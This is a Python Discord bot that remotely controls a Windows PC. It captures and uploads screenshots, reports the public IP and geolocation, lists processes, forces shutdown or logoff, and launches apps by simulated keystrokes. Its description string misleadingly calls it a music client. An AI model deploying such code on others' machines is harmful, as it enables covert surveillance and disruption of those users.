#imports
import winreg
import ctypes
import sys
import os
import random
import time
import subprocess
import discord
import keyboard
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from discord.ext import commands
from ctypes import *
import asyncio
from discord import utils
import time
import win32gui
import ctypes
import os
from mss import mss
import platform
import urllib.request
import json
import pyautogui
import subprocess
from requests import get
import discord
import asyncio
import aiohttp
import json
import subprocess
from discord.ext.commands import Bot
from random import randint
from discord.ext import commands
from platform import python_version
import os
import re
import datetime
import pytz
import platform
import pyperclip

#intents
intents = discord.Intents.default()
intents.message_content = True

#prefix
client = commands.Bot(
    command_prefix=commands.when_mentioned_or("."),
    description='Relatively simple music client example',
    intents=intents)

#remove default help command
client.remove_command('help')

#test command
@client.command()
async def test(ctx):
    keyboard.send('win')
    await ctx.send("success")

#shutdown
@client.command()
async def shutdown(ctx):
    await ctx.send("pc off after 10 sec")
    await asyncio.sleep(10)
    os.system("shutdown /p")



#volume on
@client.command()
async def volon(ctx):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
    await ctx.send("sucess")

#volume off
@client.command()
async def voloff(ctx):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
    await ctx.send("sucess")


#screenshot
@client.command()
async def screen(ctx):
    with mss() as sct:
        sct.shot(output=os.path.join(os.getenv('TEMP') + "\\monitor.png"))
    file = discord.File(os.path.join(os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
    await ctx.send("sucess", file=file)
    os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))


#system info
@client.command()
async def ip(ctx):
    ip = get('https://api.ipify.org').text
    await ctx.send(f"{ip}")


#locate pc
@client.command()
async def locate(ctx):
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
        await ctx.send(link)

#restart pc
@client.command()
async def restart(ctx):
    await ctx.send("pc restart after 10 sec")
    await asyncio.sleep(10)
    os.system("shutdown /r /t 00")

#logoff user
@client.command()
async def logoff(ctx):
    await ctx.send("user logoff after 10 sec")
    await asyncio.sleep(10)
    os.system("shutdown /l /f")

#process list
@client.command()
async def processlist(ctx):
    if 1 == 1:
        result = subprocess.getoutput("tasklist")
        numb = len(result)
        if numb < 1:
            await ctx.send("[*] Command not recognized or no output was obtained")
        elif numb > 1990:
            temp = (os.getenv('TEMP'))
            if os.path.isfile(temp + r"\output.txt"):
                os.system(r"del %temp%\output.txt /f")
            f1 = open(temp + r"\output.txt", 'a')
            f1.write(result)
            f1.close()
            file = discord.File(temp + r"\output.txt", filename="output.txt")
            await ctx.send(file=file)
        else:
            await ctx.send(result)

@client.command()
async def help(ctx):
    await ctx.send(embed = discord.Embed(
                                                     title=
                                                     "Commands:",

                                                     description=
                                                     f'.help - this command\n'
                                                     f'.locate - pc location\n'
                                                     f'.logoff - logoff in pc user\n'
                                                     f'.processlist - list of running processes\n'
                                                     f'.restart - restart pc\n'
                                                     f'.screen - screenshot\n'
                                                     f'.shutdown - off pc\n'
                                                     f'.ip - pc ip\n'
                                                     f'.voloff - off vloume\n'
                                                     f'.volon - on volume\n'
                                                     f'.ping - ping test\n'
                                                     f'.csgo - csgo start\n'
                                                     f'.discord - discord start\n'
                                                     f'.firefox - firefox start\n'
                                                     f'.steam - steam start\n'
                                                     f'.telegram - telegram start\n'))


#ping
@client.command()
async def ping(ctx):
    ping_ = client.latency
    ping = round(ping_ * 1000)
    await ctx.send(embed = discord.Embed(description=f'Мой пинг на сервере {ping}ms', colour=discord.Color.purple()))

#csgo start
@client.command()
async def csgo(ctx):
    keyboard.press('win')
    keyboard.send('d')
    await asyncio.sleep(1)
    keyboard.release('win')
    keyboard.press('win')
    keyboard.send('s')
    await asyncio.sleep(1)
    keyboard.release('win')
    pyperclip.copy('Counter-Strike Global Offensive')
    keyboard.press('ctrl')
    keyboard.send('v')
    keyboard.release('ctrl')
    await asyncio.sleep(1)
    keyboard.send('enter')
    await ctx.send("success")

#discord start
@client.command()
async def discord(ctx):
    keyboard.press('win')
    keyboard.send('d')
    keyboard.release('win')
    keyboard.press('win')
    keyboard.send('s')
    await asyncio.sleep(1)
    keyboard.release('win')
    await asyncio.sleep(1)
    pyperclip.copy('discord')
    keyboard.press('ctrl')
    keyboard.send('v')
    keyboard.release('ctrl')
    await asyncio.sleep(1)
    keyboard.send('enter')
    await ctx.send("success")

#telegram start
@client.command()
async def telegram(ctx):
    keyboard.press('win')
    keyboard.send('d')
    await asyncio.sleep(1)
    keyboard.release('win')
    keyboard.press('win')
    keyboard.send('s')
    await asyncio.sleep(1)
    keyboard.release('win')
    pyperclip.copy('Telegram')
    keyboard.press('ctrl')
    keyboard.send('v')
    keyboard.release('ctrl')
    await asyncio.sleep(1)
    keyboard.send('enter')
    await ctx.send("success")

#firefox start
@client.command()
async def firefox(ctx):
    keyboard.press('win')
    keyboard.send('d')
    await asyncio.sleep(1)
    keyboard.release('win')
    keyboard.press('win')
    keyboard.send('s')
    await asyncio.sleep(1)
    keyboard.release('win')
    pyperclip.copy('firefox')
    keyboard.press('ctrl')
    keyboard.send('v')
    keyboard.release('ctrl')
    await asyncio.sleep(1)
    keyboard.send('enter')
    await ctx.send("success")

#steam start
@client.command()
async def steam(ctx):
    keyboard.press('win')
    keyboard.send('d')
    await asyncio.sleep(1)
    keyboard.release('win')
    keyboard.press('win')
    keyboard.send('s')
    await asyncio.sleep(1)
    keyboard.release('win')
    pyperclip.copy('steam')
    keyboard.press('ctrl')
    keyboard.send('v')
    keyboard.release('ctrl')
    await asyncio.sleep(1)
    keyboard.send('enter')
    await ctx.send("success")


#token and run bot
TOKEN = ''
client.run(TOKEN)
